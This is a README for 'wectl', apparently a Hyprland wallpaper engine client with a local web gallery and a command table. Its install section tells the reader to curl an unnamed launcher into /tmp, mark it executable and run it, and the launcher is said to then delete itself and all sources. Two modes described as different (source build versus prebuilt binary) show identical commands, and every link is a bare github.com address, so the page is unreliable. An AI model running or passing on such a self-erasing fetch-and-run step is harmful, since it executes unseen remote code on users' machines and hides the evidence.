<div align="center">

# wectl

**Zero-bloat C++20 Modular Wallpaper Engine client & web gallery for Hyprland with native UNIX-socket 0% GPU fullscreen auto-pause.**

[![C++20 Modules](https://shields.io)](https://isocpp.org)
[![Hyprland](https://shields.io)](https://hyprland.org)
[![Idle GPU](https://shields.io)](#-features)
[![Release v.0.1](https://shields.io)](https://github.com)

</div>

---

## Installation Modes (Zero Prompts — Self-Cleaning)

### Mode 1: Native C++20 Source Launcher (Recommended — Clean Build & Full Cleanup)
Downloads `wectl-setup-compile`, fetches missing dependencies & C++20 module sources from this repository, compiles with `-O3 -march=native -flto`, configures `wectl.service`, and deletes all source files, temporary build artifacts, and the launcher itself:
```bash
curl -fL https://github.com -o /tmp/wectl-install && chmod +x /tmp/wectl-install && /tmp/wectl-install
```

### Mode 2: Prebuilt Binary Launcher (Instant Setup & Self-Cleanup)
```bash
curl -fL https://github.com -o /tmp/wectl-install && chmod +x /tmp/wectl-install && /tmp/wectl-install
```

### Mode 3: Manual `git clone` + Clean Install
```bash
git clone https://github.com && cd wectl/v.0.1 && make clean-install
```

---

## Commands

| Command | Description |
| :--- | :--- |
| `wectl up` | Start `wectl.service` and open the web gallery (`http://127.0.0.1:43197`) |
| `wectl status` | Show daemon status, cached display profile, active scene, FPS, and GPU renderer |
| `wectl stop` | Stop wallpaper rendering (**0% GPU**) while keeping daemon idle |
| `wectl down` | Stop both wallpaper rendering and `wectl` daemon |
| `wectl restart` | Restart `wectl.service` |
| `wectl restore` | Restore last selected wallpaper |
| `wectl random` | Apply a random wallpaper from `wallpapers/scenes/` |
| `wectl <scene>` | Launch a specific wallpaper scene |
